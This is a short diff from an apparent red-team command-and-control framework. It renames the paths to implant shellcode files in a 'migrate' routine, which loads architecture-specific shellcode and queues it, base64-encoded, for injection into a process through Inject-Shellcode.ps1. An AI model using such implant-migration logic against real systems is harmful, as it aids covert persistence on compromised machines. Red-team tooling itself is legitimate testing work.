@@ -474,12 +474,12 @@ def migrate(randomuri, user, params=""):
     arch = "86"
 
   if implant_comms == "Normal":
-    shellcodefile = load_file("%s/payloads/Posh-shellcode_x%s.bin" % (ROOTDIR,arch))
+    shellcodefile = load_file("%spayloads/Posh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch))
   elif implant_comms == "Daisy":
     daisyname = raw_input("Name required: ")
-    shellcodefile = load_file("%s/payloads/%sPosh-shellcode_x%s.bin" % (ROOTDIR,daisyname,arch))
+    shellcodefile = load_file("%spayloads/%sPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,daisyname,arch))
   elif implant_comms == "Proxy":
-    shellcodefile = load_file("%s/payloads/ProxyPosh-shellcode_x%s.bin" % (ROOTDIR,arch))
+    shellcodefile = load_file("%spayloads/ProxyPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch))
 
   check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
   new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), user, randomuri)
